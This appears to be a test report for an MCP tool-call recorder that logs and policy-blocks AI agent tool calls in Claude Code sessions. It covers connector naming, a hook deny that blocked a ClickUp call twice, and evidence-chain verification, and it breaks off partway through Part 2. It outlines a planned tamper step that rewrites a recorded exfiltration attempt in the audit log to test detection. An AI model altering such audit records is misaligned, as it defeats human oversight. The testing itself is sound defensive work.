# Local dogfood 6: the first run of `@edut/mcp-recorder` in a local Claude Code session (WSL)

- Repository: `cresec-ai/audit`. The prompt was `docs/dogfood/local-dogfood-6-prompt.md` on `origin/dogfood/6-policy`, last changed in `6426484`.
- Code under test: `main` at `6dc4399` (Parts 0–3 and 5) and `feat/evidence-sink` at `1d8fe99` (Part 4).
- Machine: a Windows 11 host plus a WSL2 distro named `Ubuntu-20.04`. The OS inside is Ubuntu 24.04.3 LTS, kernel `6.6.87.2-microsoft-standard-WSL2`. The VM sees 8 vCPUs (`nproc`) and `Mem: 28066` MiB (`free -m`). Node is `v24.21.0` (nvm) with npm `11.19.0`.
- This machine has two local Claude Code surfaces, and both are covered below:
  1. **Desktop Code tab.** Claude Code `2.1.271`, installed per-user under `%APPDATA%\Claude\claude-code\2.1.271\` and launched by the MSIX-packaged Claude Desktop app (`Claude_2.110.0.0`). It runs **on the Windows host**, with a UNC working directory into WSL. The session that ran this prompt is one of these, and its own git worktree sits at `9d0ec97`.
  2. **WSL CLI.** Claude Code `2.1.272` at `~/.local/bin/claude`, running **inside WSL**.

  Both surfaces are signed in to the same claude.ai account and organization. The first 12 hex characters of sha256(`oauthAccount.accountUuid`) and of sha256(`oauthAccount.organizationUuid`) match between the Windows and WSL `~/.claude.json`: `256dc0ff…` and `b7773124…` on both sides.
- Recorders active:
  - Part 2: `node dist/cli.js hook --data-dir /tmp/df6-local --policy /tmp/df6-local-policy.json` (WSL CLI session), alongside the repo's tracked `node dist/cli.js hook --data-dir .mcp-recorder`.
  - Part 3: `record --policy docs/examples/policy.demo.yaml` around the demo `corp-notes` server.
  - Part 4: `record` with `MCP_RECORDER_SINK`, auto-starting `ship`, plus the reference receiver on `127.0.0.1:8787` (and `:8788` in tamper step D).
- Date: 2026-09-17, 08:58–09:25 UTC, with follow-up measurements at 09:49–09:52 UTC. All times in this report are UTC.

**How pasted output was edited.** This repository is public, so:

- The machine hostname is `<host>` and the OS user is `<user>`, including inside paths (`/home/<user>/…`).
- The receiver's operator bearer token is `<redacted>`, and one identity fingerprint derived from hostname and user is `sha256:<redacted>`.
- Helper-script paths are shortened to their basenames: `node gwdrive.cjs` stands for `node <scratch dir>/gwdrive.cjs`.
- Omitted lines are marked `…`.
- A line starting `GET /v1/… →` is a one-line summary of a curl response, printed by the named helper `chains.cjs` or a `node -e` filter. It is not raw JSON.
- Blocks marked **(in-session)** come from tool calls of the Desktop session itself: its connector-status tool, its tool list, its start-of-session git status, and PowerShell/Git Bash commands whose output was not redirected to a log at the time. They are recorded verbatim in the run's `session-observations.txt`.
- Command lines marked **(condensed)** drop a `timeout`, a `2>&1`, or an output filter, or merge two identical runs.

Everything else is pasted from the log files of the commands that were run.

**Personal-data note.**

- The only live hosted-connector call this run made was `clickup_filter_tasks` against the owner's real ClickUp workspace. It was denied both times before it executed (Part 2), so no workspace data was returned.
- Part 1 lists connector and extension *names* only.
- Every recorded event holds the real hostname and OS username in plaintext (`identity.hostname`, `identity.os_user`), by design. For that reason the signed export bundles are **not** committed (see "Files in this directory").

---

## Decisions I made without asking (the prompt said to write them down)

1. **Every repo command (git, npm, `dist/cli.js`, the receiver) ran in the main WSL checkout** (`/home/<user>/dev/cresec/audit`), not in the Desktop session's own git worktree. The Desktop app creates worktrees with Windows git, which writes a `//wsl.localhost/...` gitdir, so git inside WSL cannot use them (exact error under "WSL-specific problems"). The main checkout was clean and had no stash.

   There are three exceptions:
   - read-only Windows-git status checks of the Desktop worktree (Part 0);
   - the Windows-host probes in Part 2, which ran on the Windows side;
   - one of those probes temporarily edited, then restored, the Desktop worktree's `.claude/settings.local.json`.
2. **Part 1 covers both local surfaces**, because they turned out to disagree with each other.
3. **Part 2's "new session" is a fresh WSL CLI session** (`claude -p` with stream-json output).
   - I did not open a new Desktop Code tab. That would have needed UI automation of the Desktop app, or you.
   - The standalone Windows-host `claude.exe` is not signed in, and signing in is not something I will do.
   - For the Windows host I therefore ran a synthetic hook-pipe test and one extra probe, both labelled as such.
4. **Part 2 installs into `.claude/settings.local.json`, not the default.** The default target of `hook install` is `.claude/settings.json`, which is **tracked** in this repo, and the prompt forbids touching tracked files outside `evidence/`. `settings.local.json` is ignored by the user's global gitignore: `git check-ignore -v` prints `/home/<user>/.config/git/ignore:1:**/.claude/settings.local.json`.
5. **Part 2 passes `--allowedTools mcp__claude_ai_ClickUp__clickup_filter_tasks`**, so a block can only come from the hook and never from Claude Code's own permission layer.
6. **Part 3 drives the gateway with raw newline-delimited JSON-RPC** (a small script, no SDK) and wraps the demo server in a `tee` shim. That captures exact bytes on both sides of the proxy, so "byte-for-byte" is measured rather than eyeballed.
7. **Part 4's "some stdio MCP server" is the repo's demo `corp-notes` server**, driven by the same script.
   - The tamper edits `$.tool` of the first `http_post` `tool_call`, turning a recorded exfiltration attempt into a harmless `read_note`.
   - To make the sqlite row editable I dropped the append-only trigger and recreated it afterwards.
   - The prompt's own steps are A and B. I added C–E so the shipper actually had to *send* something.

---

## Part 0: start clean, ground truth

```
$ git stash list && git status --short
[exit 0]
$ git branch --show-current
main
[exit 0]
$ git fetch origin && git checkout main && git pull origin main
Already on 'main'
Your branch is behind 'origin/main' by 1 commit, and can be fast-forwarded.
  (use "git pull" to update your local branch)
From github.com:<owner>/audit
 * branch            main       -> FETCH_HEAD
Updating 6307cc3..6dc4399
Fast-forward
 docs/connector-coverage.md |   70 +-
 docs/features.md           | 1536 ++++++++++++++++++++++++++++++++++++++++++++
 docs/overview.md           |  841 ++++++++++++++++++++++++
 docs/roadmap.md            |  628 ++++++++++++++++++
 4 files changed, 3059 insertions(+), 16 deletions(-)
 create mode 100644 docs/features.md
 create mode 100644 docs/overview.md
 create mode 100644 docs/roadmap.md
[exit 0]
$ git log --oneline -5
6dc4399 docs: overview, feature reference and roadmap, plus connector-coverage after dogfood 5 (#18)
6307cc3 Typecheck the tests, and fix the three drifts that found (#17)
6f5725b hook: resolve a connector by the tool it declares, not only by its config key (#16)
b322dea Gateway mode: policy.yaml v1, per-tool allow/hold/deny, tool-result boundary filter, Rego compiler (#8)
263d299 AGENTS.md: two things that bite when setting up a dogfood run (#15)
[exit 0]
$ command -v node npm; node --version && npm --version
/home/<user>/.nvm/versions/node/v24.21.0/bin/node
v24.21.0
11.19.0
[exit 0]
$ sh scripts/bootstrap.sh
[exit 0]
$ npm run typecheck && npx eslint . && npm test
> @edut/mcp-recorder@0.1.0 typecheck
> tsc -p tsconfig.json --noEmit && tsc -p tsconfig.test.json
…
 ❯ test/policy.test.ts (166 tests | 1 failed) 3169ms
…
   × checkCatastrophicShape: an ambiguous alternation anywhere in the body > a literal overlapping a class is rejected 52ms
     → expected 3.759023000000525 to be greater than 16.076052000000345
…
 FAIL  test/policy.test.ts > checkCatastrophicShape: an ambiguous alternation anywhere in the body > a literal overlapping a class is rejected
AssertionError: expected 3.759023000000525 to be greater than 16.076052000000345
 ❯ test/policy.test.ts:1955:22
    1953|     time(6); // warm
    1954|     const short = Math.max(time(12), 0.01);
    1955|     expect(time(18)).toBeGreaterThan(short * 4);
       |                      ^
    1956|   });
…
 Test Files  1 failed | 31 passed (32)
      Tests  1 failed | 1316 passed | 3 skipped (1320)
   Start at  <local time>
   Duration  42.47s (transform 3.57s, setup 0ms, collect 7.72s, tests 225.41s, environment 9ms, prepare 3.63s)

[exit 1]
```

The `From` line's GitHub owner is shown as `<owner>`: the fetch URL uses a personal account's path. CI for the same commit runs on `cresec-ai/audit` (below).

Typecheck and ESLint passed: ESLint printed nothing, and the `&&` chain went on to `npm test`. **The first full test run on a clean `main` failed 1 of 1320 tests.** Reproduction attempts followed immediately, and the CI check came after them:

```
$ npx vitest run test/policy.test.ts 2>&1 | grep -E "×|Tests |FAIL"      (run three times)
      Tests  166 passed (166)
      Tests  166 passed (166)
      Tests  166 passed (166)
$ npm test 2>&1 | grep -E "×|Tests |Test Files|FAIL|→"
…
 Test Files  32 passed (32)
      Tests  1317 passed | 3 skipped (1320)
$ PATH=$PATH:/usr/bin gh run list --repo cresec-ai/audit --branch main --limit 5 2>&1 || true
completed	success	docs: overview, feature reference and roadmap, plus connector-coverag…	CI	main	push	35188253469	3m40s	2026-09-17T06:04:15Z
…
```

**Verdict: a flaky wall-clock assertion. It failed 1 of 2 full-suite runs here and passed 3 of 3 single-file runs, and CI on the same commit is green.**

- The test asserts `time(18) > 4 × time(12)`. The failure message implies `time(12)` ≈ 4.02 ms (16.076 / 4) and `time(18)` ≈ 3.76 ms.
- So the longer input was not slower at all, let alone 4× slower.
- The likeliest reason is timing noise while the full suite ran on 8 workers (tests 225 s over 42 s of wall clock). The logs do not show which measurement was disturbed.
- It was seen on this WSL machine. I have not shown that it is WSL-specific.

One of the 3 skipped tests is the OPA parity suite, which printed `no opa binary found … skipping OPA parity tests`.

**The Desktop session's own worktree (not the checkout under test) shows three modified files.**

- **(in-session)** The git status that the Desktop app injected at session start (08:51Z, before the run) already listed `M .claude/hooks/session-start.sh`, `M scripts/bootstrap.sh` and `M scripts/dogfood-wrap.sh`.
- Windows git in `.claude/worktrees/mcp-recorder-claude-desktop-0d281d`, observed at 09:49Z:

```
$ git status --short
…
 M .claude/hooks/session-start.sh
 M scripts/bootstrap.sh
 M scripts/dogfood-wrap.sh
$ git diff --summary
…
 mode change 100755 => 100644 .claude/hooks/session-start.sh
 mode change 100755 => 100644 scripts/bootstrap.sh
 mode change 100755 => 100644 scripts/dogfood-wrap.sh
$ git diff --stat
…
 .claude/hooks/session-start.sh | 0
 scripts/bootstrap.sh           | 0
 scripts/dogfood-wrap.sh        | 0
 3 files changed, 0 insertions(+), 0 deletions(-)
$ git config --get core.filemode
true
```

Each `…` above stands for two `core.useBuiltinFSMonitor` hints and an "incompatible with fsmonitor" warning. The changes are exec-bit artifacts of Windows git reading a WSL filesystem; no content changed. Nothing in this run touched those files, so there is nothing to restore.

---

## Part 1: the naming-convention datum

### Is there a `/tmp/mcp-config-*.json`?

**No, on either side of the machine, including while a WSL CLI session was running.**

```
$ ls -la /tmp/mcp-config-*.json 2>&1          # WSL, before any WSL CLI session
ls: cannot access '/tmp/mcp-config-*.json': No such file or directory
$ ls -la /tmp/mcp-config-*.json 2>&1          # WSL, right after a `claude -p` session exited
ls: cannot access '/tmp/mcp-config-*.json': No such file or directory

# follow-up: polled every 0.25 s WHILE a `claude -p` session ran
t=1: claude pid 289734 argv: timeout 120 claude -p Reply with the single word OK. --output-format text
t=27: session exited
polls done; /tmp/mcp-config-* during session: 0 file(s) at end
```

No poll printed `FOUND mcp-config file(s)`. The argv shown belongs to the `timeout` wrapper, which passes its arguments to `claude` unchanged, and there is no `--mcp-config`.

On the Windows host, a scan of `%TEMP%`, `%LOCALAPPDATA%\Temp` and `C:\tmp` for `mcp-config*` printed nothing (`p1-win.log`). Only those three directories were checked. The Desktop's Claude Code process is also launched **without `--mcp-config`**. The flag names below are from `p1-win.log`; the `--settings` shape and the `--mcp-config` check are from a second script; the `--setting-sources` value is from the follow-up `p6-win.log`:

```
pid=27304 ppid=8084 name=claude.exe exe=C:\Users\<user>\AppData\Roaming\Claude\claude-code\2.1.271\claude.exe cmdline_len=3350 mcp-config-flag=False
   flags: --output-format --verbose --input-format --thinking --effort --model --permission-prompt-tool --resume --allowedTools --disallowedTools --setting-sources --permission-mode --allow-dangerously-skip-permissions --include-partial-messages --await-initialize --thinking-display --replay-user-messages --settings
pid=8084 ppid=13324 name=claude.exe exe=C:\Program Files\WindowsApps\Claude_2.110.0.0_x64__pzs8sxrjxfjjc\app\claude.exe cmdline_len=82 mcp-config-flag=False
---
## --settings value shape
starts with: " ; length of remaining cmdline: 1737
settings JSON top-level keys: ultracode, deniedMcpServers
## --mcp-config / --strict-mcp-config present?
mcp-config: False  strict: False
---
$ --setting-sources value of the Desktop Code-tab claude.exe (pid 27304)
--setting-sources=user,project,local
```

### Where MCP server config actually lives locally (keys only)

Each row was printed by a keys-only command, a PowerShell `ConvertFrom-Json` or a `node -e` `Object.keys` one-liner, into the log named in the row.

| File | Keys only | Log |
| --- | --- | --- |
| Windows `~/.claude.json` | no top-level `mcpServers`; `projects[//wsl.localhost/ubuntu-20.04/home/<user>/dev/cresec/audit].mcpServers` keys: `[]` | `p1-win.log` |
| WSL `~/.claude.json` | `user mcpServers keys: []`; no project entry with a non-empty `mcpServers` | `p1-wsl.log` |
| `.mcp.json` (tracked; main checkout and Desktop worktree) | `["corp-notes","repo-filesystem"]` | `p1-wsl2.log`, `p1-cli2.log` |
| `claude_desktop_config.json` (Desktop *chat* config) | `mcpServers keys: [corp-notes] [clickup]`; the `clickup` entry has keys `["command","args"]`, with no `url` and no `tools[]` | `p1-win.log`, `p6-wsl.log` |
| **Desktop session metadata**, `%APPDATA%\Claude\claude-code-sessions\<account>\<org>\local_<id>.json` (on disk under the MSIX `LocalCache`) | Top-level keys include `enabledMcpTools` and `remoteMcpServersConfig`, and there is **no `mcpServers`** key. This is the file that maps this session's hosted connectors, and the only file whose shape I inspected. About 400 other local files also contain the ClickUp UUID (other Desktop session files, agent-mode session files, `logs\main.log`, transcripts, IndexedDB blobs). Those were counted, not opened. | `p1-win2.log`, `p1-wsl2.log`, `p1-wsl3.log` |

```
$ node sessshape.cjs <Desktop session file for this very session>
cliSessionId = 3c867258-… | worktreeName = mcp-recorder-claude-desktop-0d281d | …
remoteMcpServersConfig: array of 5
 - {"uuid":"string","name":"string","url":"string","tools":"array(61)"} | name = "ClickUp" | uuid = 47d587b8-3fb9-42e9-b596-f8b25371248c  url.host=mcp.clickup.com
 - {"uuid":"string","name":"string","url":"string","tools":"array(29)"} | name = "Gmail" | uuid = ce5e992d-730d-4f07-95c8-4ba759ea3e3b  url.host=gmailmcp.googleapis.com
 - {"uuid":"string","name":"string","url":"string","tools":"array(9)"} | name = "Google Calendar" | uuid = 6580aef4-db58-41af-bffa-256f5d9fa6e5  url.host=calendarmcp.googleapis.com
 - {"uuid":"string","name":"string","url":"string","tools":"array(11)"} | name = "Google Drive" | uuid = 66b16897-54e1-4453-9bb4-5b5e09ca9f9e  url.host=drivemcp.googleapis.com
 - {"uuid":"string","name":"string","url":"string","tools":"array(2)"} | name = "visualize" | uuid = 6f616b42-0ed8-571e-823f-ee4aca6b7ce9  url.host=sandbox.claudemcpcontent.com
enabledMcpTools key prefixes (before ":") with counts: {"47d587b8-3fb9-42e9-b596-f8b25371248c":59}
```

`enabledMcpTools` has 59 ClickUp entries, but the connector has 61 tools. I did not look into the difference.

### Tool names each surface actually presents

**Desktop Code tab (Windows host), (in-session).** The connector-status tool (excerpt):

```
{"name":"corp-notes","kind":"project","transport":"stdio","status":"failed","error":"Connection closed"}
{"name":"ClickUp","id":"47d587b8-3fb9-42e9-b596-f8b25371248c","kind":"connector","status":"connected","tool_count":61}
{"name":"visualize","id":"6f616b42-0ed8-571e-823f-ee4aca6b7ce9","kind":"connector","status":"connected","tool_count":2}
{"name":"Desktop Commander","kind":"desktop","status":"connected","tool_count":26}
{"name":"scheduled-tasks","kind":"other","status":"connected","tool_count":6}
```

The session's tool list shows how each kind of server is named:

- **claude.ai connectors** use their UUID as the segment: `mcp__47d587b8-3fb9-42e9-b596-f8b25371248c__clickup_filter_tasks`. Gmail, Calendar and Drive follow the same pattern.
- **Two segments are named for `visualize`**: `mcp__visualize__{read_me,show_widget}` and `mcp__6f616b42-0ed8-571e-823f-ee4aca6b7ce9__{read_me,show_widget}`. The status tool lists a single `visualize` connector with `tool_count: 2`. I did not verify whether the friendly pair is the same connector or a separate in-app server with the same name.
- **Desktop extensions** use the display name with spaces replaced by `_`, e.g. `mcp__Desktop_Commander__*`, and the same pattern holds for two other installed extensions. Desktop Commander's manifest `name` is `desktop-commander`, a third spelling.
- **`corp-notes`** appears as `mcp__corp-notes__{http_post,list_notes,read_file,read_note}`, even though its status says `failed` / CONNECTION_CLOSED. I did not work out where those four tool names come from.
- **In-app servers** (`ccd_*`, `Claude_Browser`, `claude-in-chrome`, `computer-use`, `mcp-registry`, `terminal`) are in the tool list but not in the connector-status list.

The Windows host has no `node` or `npx` on PATH (logged follow-up):

```
$ Get-Command node, npx, sh (Windows host, this PowerShell spawned by the Desktop Code-tab session)
node -> NOT FOUND
npx -> NOT FOUND
sh -> C:\Program Files\Git\usr\bin\sh.exe
$ where.exe node
INFO: Could not find files for the given pattern(s).
```

**WSL CLI.** From `claude mcp list` (everything after the first ": " stripped for hosted entries) and from the `system/init` message of two `claude -p` runs in which every server had finished connecting:

```
$ claude mcp list        (condensed: timeout 120 claude mcp list 2>&1 | sed -E … | cut -c1-120)
Checking MCP server health…

claude.ai ClickUp   [status: Connected]
claude.ai Google Drive   [status: Connected]
claude.ai Google Calendar   [status: Connected]
claude.ai Gmail   [status: Connected]
corp-notes: sh scripts/dogfood-wrap.sh --name corp-notes -- npx tsx demo/server.ts - ⏸ Pending approval (run `claude`
repo-filesystem: sh scripts/dogfood-wrap.sh --name repo-filesystem -- npx -y @modelcontextprotocol/server-filesystem . -
$ claude -p "Reply with the single word OK." --output-format stream-json --verbose < /dev/null | node initshape.cjs     (condensed: timeout 300 and 2>&1 dropped; two runs, the second with MCP_CONNECTION_NONBLOCKING=0, printed identical lines below)
init keys: type, subtype, cwd, session_id, tools, mcp_servers, model, …
mcp_servers: [{"name":"corp-notes","status":"connected"},{"name":"repo-filesystem","status":"connected"},{"name":"claude.ai ClickUp","status":"connected"},{"name":"claude.ai Google Drive","status":"connected"},{"name":"claude.ai Google Calendar","status":"connected"},{"name":"claude.ai Gmail","status":"connected"}]
  segment [claude_ai_ClickUp]  61 tools, e.g. mcp__claude_ai_ClickUp__clickup_filter_tasks
  segment [claude_ai_Gmail]  29 tools, e.g. mcp__claude_ai_Gmail__apply_sensitive_message_label
  segment [claude_ai_Google_Calendar]  9 tools, e.g. mcp__claude_ai_Google_Calendar__create_event
  segment [claude_ai_Google_Drive]  11 tools, e.g. mcp__claude_ai_Google_Drive__copy_file
  segment [corp-notes]  4 tools, e.g. mcp__corp-notes__http_post
  segment [repo-filesystem]  14 tools, e.g. mcp__repo-filesystem__create_directory
total tools: 154
result subtype: success | is_error: false | cost_usd: …
```

The init message is not always complete. In the Part 2 session, `claude.ai ClickUp` was still `pending` at init, and the init tool list had **no** ClickUp tools. The line below was computed by a `node -e` one-liner over `p2-session.stream.jsonl`:

```
Part 2 session init: mcp tool counts by segment: {"claude_ai_Gmail":29,"claude_ai_Google_Calendar":9,"claude_ai_Google_Drive":11,"corp-notes":4,"repo-filesystem":14}
```

### The convention table

| Surface | Server | Identifier in the config files I inspected | Tool-name segment | Config key == segment? |
| --- | --- | --- | --- | --- |
| Desktop Code tab (Windows host) | ClickUp (claude.ai connector) | **No `mcpServers` key.** Only `remoteMcpServersConfig[i]` in the Desktop session file, with `uuid: 47d587b8-…` and `name: "ClickUp"` | `47d587b8-3fb9-42e9-b596-f8b25371248c` | **No key exists.** The segment equals the connector's `uuid`, not its `name`. |
| Desktop Code tab | visualize (claude.ai connector) | `remoteMcpServersConfig[i]`: `uuid: 6f616b42-…`, `name: "visualize"` | `6f616b42-0ed8-571e-823f-ee4aca6b7ce9`; a friendly `visualize` segment also exists (see above) | No key exists. |
| Desktop Code tab | Desktop extension "Desktop Commander" | not in any `mcpServers`. Session display name `Desktop Commander`; manifest `name` `desktop-commander` | `Desktop_Commander` | **No** (matches neither spelling) |
| Desktop Code tab | `corp-notes` (source not established: project `.mcp.json` or Desktop chat config, both keyed `corp-notes`) | key `corp-notes` | `corp-notes` (in the tool list; the project server's status is `failed`) | **Yes** |
| WSL CLI | ClickUp (claude.ai connector) | **No config file found.** `claude mcp list` calls the server `claude.ai ClickUp` | `claude_ai_ClickUp` | **No key exists.** The segment is that name with `.` and space replaced by `_`. |
| WSL CLI | `corp-notes`, `repo-filesystem` (project `.mcp.json`) | keys `corp-notes`, `repo-filesystem` | same | **Yes** |

**Plainly: on both local Claude Code surfaces, the config key for a claude.ai hosted connector does not equal the tool-name segment, because no config key exists.** There is no `/tmp/mcp-config-*.json`, and no hosted connector has an `mcpServers` entry in any file I inspected.

The two surfaces are signed in to the same account on the same machine, yet they name the same connector differently: `47d587b8-…` in the Desktop Code tab and `claude_ai_ClickUp` in the WSL CLI. Neither matches cloud dogfood 4's friendly `ClickUp`. For project `.mcp.json` servers the key does equal the segment, but that does not help the hook (next paragraph).

**Why that matters for the hook.** `resolveServerOrigin` reads exactly two sources: `MCP_RECORDER_MCP_CONFIG` if it is set, otherwise the `/tmp/mcp-config-*.json` glob (`src/hook/mcp-config.ts:51-56` and `:152-168`). It never reads `.mcp.json`, `~/.claude.json`, the Desktop configs or the Desktop session file. An entry also yields nothing unless it has a `url` (`:302-305`), and stdio `.mcp.json` servers have none. So in a local session without `MCP_RECORDER_MCP_CONFIG`, route 1 and route 2 both resolve nothing for **every** server, hosted connectors and `.mcp.json` servers alike. Two direct tests of the local files that name these servers:

```
# the Desktop session file (maps the UUID), tool name as the Desktop presents it
$ printf '%s' '{"session_id":"df6-cfg-probe",…,"tool_name":"mcp__47d587b8-3fb9-42e9-b596-f8b25371248c__clickup_filter_tasks",…}' | MCP_RECORDER_MCP_CONFIG=$DESK node dist/cli.js hook --data-dir /tmp/df6-local-cfg; echo; node dumpevents.cjs /tmp/df6-local-cfg/evidence.db | grep -A4 '"server"'

 "server": {
  "command": "hook:claude-code",
  "name": "claude-code",
  "transport": "stdio"
 },
--
 "server": {
  "command": "hook:claude-code",
  "name": "47d587b8-3fb9-42e9-b596-f8b25371248c",
  "transport": "stdio"
 },

# the Desktop chat config (key "clickup", a wrapped stdio command), follow-up
$ rm -rf /tmp/df6-local-cfg2; printf '%s' '{"session_id":"df6-cfg-probe2",…,"tool_name":"mcp__clickup__clickup_filter_tasks",…}' | MCP_RECORDER_MCP_CONFIG=<claude_desktop_config.json> node dist/cli.js hook --data-dir /tmp/df6-local-cfg2; node dumpevents.cjs /tmp/df6-local-cfg2/evidence.db | grep -A5 '"server"'
 "server": {
  "command": "hook:claude-code",
  "name": "claude-code",
  "transport": "stdio"
 },
 "session_id": "df6-cfg-probe2",
--
 "server": {
  "command": "hook:claude-code",
  "name": "clickup",
  "transport": "stdio"
 },
 "session_id": "df6-cfg-probe2",
```

In each test, the first block is `session_start` and the second is the `tool_call`, and neither `tool_call` got a `server.url`. The session file has no `mcpServers` object (`mcpServersOf`, `:289-298`). The chat config's `clickup` entry has no `url`.

**Consequences:**

- Locally, `server.url` is never recorded, and a host-alias deny rule (`^mcp__mcp\.clickup\.com__…`) can never fire. Only tool-anchored rules work.
- The comment at `src/hook/mcp-config.ts:37-38` says "A local session is keyed by friendly name with friendly tool names (route 1 again)". That is wrong for claude.ai connectors on this machine, and irrelevant for `.mcp.json` servers, because the hook never reads that file.
- PR #16's route 2 still has not run live, and no local session on this machine can exercise it.

---

## Part 2: does a hook deny work locally?

### Install (WSL CLI leg)

```
$ cat /tmp/df6-local-policy.json
{
  "deny": [
    { "tool": "^mcp__.*__clickup_filter_tasks$", "reason": "df6-local: tool-anchored deny" }
  ],
  "default": "allow"
}
$ node dist/cli.js hook install --settings .claude/settings.local.json --data-dir /tmp/df6-local --policy /tmp/df6-local-policy.json
settings: /home/<user>/dev/cresec/audit/.claude/settings.local.json
installed hooks for: PreToolUse, PostToolUse, PostToolUseFailure, SessionEnd, Stop

backup: /home/<user>/dev/cresec/audit/.claude/settings.local.json.bak-2026-09-17T09-10-36.586Z
```

The generated command is the same for all five events:

```
"/home/<user>/.nvm/versions/node/v24.21.0/bin/node" "/home/<user>/dev/cresec/audit/dist/cli.js" hook --data-dir "/tmp/df6-local" --policy "/tmp/df6-local-policy.json"
```

It uses absolute Linux paths, which is right for a WSL session, but it cannot run from the Windows host (see below).

The **tracked** `.claude/settings.json` on `main` already installs the repo's own hook, without a policy. A session in this checkout therefore ran **both** hooks. Logged follow-up, abridged:

```
$ git show main:.claude/settings.json
{
  "hooks": {
    "SessionStart": [ … "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/session-start.sh" … ],
    "PreToolUse": [ { "matcher": "mcp__.*", "hooks": [ { "type": "command", "command": "node dist/cli.js hook --data-dir .mcp-recorder" } ] } ],
    "PostToolUse": [ …same matcher and command… ],
    "PostToolUseFailure": [ …same… ],
    "SessionEnd": [ …"node dist/cli.js hook --data-dir .mcp-recorder"… ],
    "Stop": [ …same… ]
  }
}
```

### A new session tries the denied tool, twice

This is the raw stream-json, summarized by `streamshape.cjs`. That helper prints tool calls and error text verbatim, and successful results as shape only.

```
$ timeout 300 claude -p 'This is an authorized test of a tool-call policy hook. Call the tool mcp__claude_ai_ClickUp__clickup_filter_tasks with the smallest valid arguments (no filters if allowed). Then call the exact same tool a SECOND time with the same arguments, whatever the first result was. Do not call any other tool. …' --output-format stream-json --verbose --allowedTools mcp__claude_ai_ClickUp__clickup_filter_tasks < /dev/null
…
[init] session_id e4c546e7-716e-4f54-94a6-6caa1a3b1688 | mcp_servers ["corp-notes:connected","repo-filesystem:connected","claude.ai ClickUp:pending","claude.ai Google Drive:connected","claude.ai Google Calendar:connected","claude.ai Gmail:connected"]
…
[tool_use] toolu_01W9LB3iWCZJqhtSf7C5Bike ToolSearch args keys: ["query","max_results"] args: {"query":"select:mcp__claude_ai_ClickUp__clickup_filter_tasks","max_results":5}
[tool_result] toolu_01W9LB3iWCZJqhtSf7C5Bike is_error=false text length 0 shape: (not JSON)
[assistant text] "Calling the tool twice with minimal arguments now."
[tool_use] toolu_01Kce2pYgkQqTvyhYvgXdngZ mcp__claude_ai_ClickUp__clickup_filter_tasks args keys: [] args: {}
[tool_result] toolu_01Kce2pYgkQqTvyhYvgXdngZ is_error=true TEXT: "mcp-recorder policy: df6-local: tool-anchored deny"
[tool_use] toolu_01Gix8SWjP56eR81M9K7nNwB mcp__claude_ai_ClickUp__clickup_filter_tasks args keys: [] args: {}
[tool_result] toolu_01Gix8SWjP56eR81M9K7nNwB is_error=true TEXT: "mcp-recorder policy: df6-local: tool-anchored deny"
[assistant text] "call 1: blocked\ncall 2: blocked"
[result] success is_error false num_turns 4 permission_denials [{"tool_name":"mcp__claude_ai_ClickUp__clickup_filter_tasks","tool_use_id":"toolu_01Kce2pYgkQqTvyhYvgXdngZ","tool_input":{}},{"tool_name":"mcp__claude_ai_ClickUp__clickup_filter_tasks","tool_use_id":"toolu_01Gix8SWjP56eR81M9K7nNwB","tool_input":{}}] | final: "call 1: blocked\ncall 2: blocked"
```

**Both calls were blocked.** No ClickUp data came back, and Claude Code lists both calls under `permission_denials`.

### `sessions`, `verify`, `query` on `/tmp/df6-local`

```
$ node dist/cli.js sessions --data-dir /tmp/df6-local
SESSION   STARTED                   ENDED                     SERVER       EVENTS  TOOL_CALLS  ERRORS  SERVERS  DECISIONS  LAST_EVENT
e4c546e7  2026-09-17T09:11:04.410Z  2026-09-17T09:11:07.901Z  claude-code  5       2           2       1        0          2026-09-17T09:11:07.901Z
[exit 0]
$ node dist/cli.js verify --data-dir /tmp/df6-local
verify store /tmp/df6-local/evidence.db (sqlite)
pinned signer: ed25519 8f3608f01f71230d… (/tmp/df6-local/identity.pub)
PASS — chain intact: 5 event(s), head seq 5
signed head: seq 5 by ed25519 8f3608f01f71230d… at 2026-09-17T09:11:07.911Z
[exit 0]
$ node dist/cli.js query clickup_filter_tasks --data-dir /tmp/df6-local
TIMESTAMP                 KIND       NAME                  SESSION   MATCHED_ON  PATH
2026-09-17T09:11:04.410Z  tool_call  clickup_filter_tasks  e4c546e7  name        $.tool
2026-09-17T09:11:05.822Z  tool_call  clickup_filter_tasks  e4c546e7  name        $.tool

2 matches across 1 sessions
[exit 0]
$ node dist/cli.js query mcp__claude_ai_ClickUp__clickup_filter_tasks --data-dir /tmp/df6-local
0 matches across 0 sessions
[exit 0]
$ node dist/cli.js query e4c546e7-716e-4f54-94a6-6caa1a3b1688 --data-dir /tmp/df6-local
TIMESTAMP                 KIND           NAME                  SESSION   MATCHED_ON  PATH
2026-09-17T09:11:04.410Z  session_start                        e4c546e7  plain       $.session_id
2026-09-17T09:11:04.410Z  tool_call      clickup_filter_tasks  e4c546e7  plain       $.session_id
2026-09-17T09:11:05.822Z  tool_call      clickup_filter_tasks  e4c546e7  plain       $.session_id
2026-09-17T09:11:07.483Z  notification   claude-code/stop      e4c546e7  plain       $.session_id
2026-09-17T09:11:07.901Z  session_end                          e4c546e7  plain       $.session_id

5 matches across 1 sessions
[exit 0]
```

The recorded deny at seq 2 is below. Seq 3 is identical apart from ids and timestamp. This is an excerpt, re-flowed, with `event_id`, `result_hash`, `schema` and `timestamp` left out and the identity block redacted:

```json
{
 "args": {},
 "attributes": { "error.type": "policy_denied", "gen_ai.operation.name": "execute_tool",
  "gen_ai.tool.call.id": "toolu_01Kce2pYgkQqTvyhYvgXdngZ", "gen_ai.tool.name": "clickup_filter_tasks",
  "mcp.method.name": "tools/call", "rpc.system": "hook" },
 "duration_ms": 0,
 "error": { "message_ref": "sha256:b350f00c953f55275eb53f324edc5ef1f28c55cda7dce70d83d93cd247867646", "type": "policy_denied" },
 "identity": { "fingerprint": "sha256:<redacted>", "hostname": "<host>", "os_user": "<user>" },
 "is_error": true, "kind": "tool_call", "phase": "pre", "request_id": "toolu_01Kce2pYgkQqTvyhYvgXdngZ", "result": null,
 "server": { "command": "hook:claude-code", "name": "claude_ai_ClickUp", "transport": "stdio" },
 "session_id": "e4c546e7-716e-4f54-94a6-6caa1a3b1688", "source": "hook", "tool": "clickup_filter_tasks"
}
```

`server.name` is `claude_ai_ClickUp` and there is no `server.url`, as Part 1 predicts.

### The repo's own hook recorded the same two calls differently

The tracked hook has no policy and wrote into `.mcp-recorder/` in the checkout:

```
$ node dumpevents.cjs .mcp-recorder/evidence.db e4c546e7      (seq 55, excerpt; seq 56 the same)
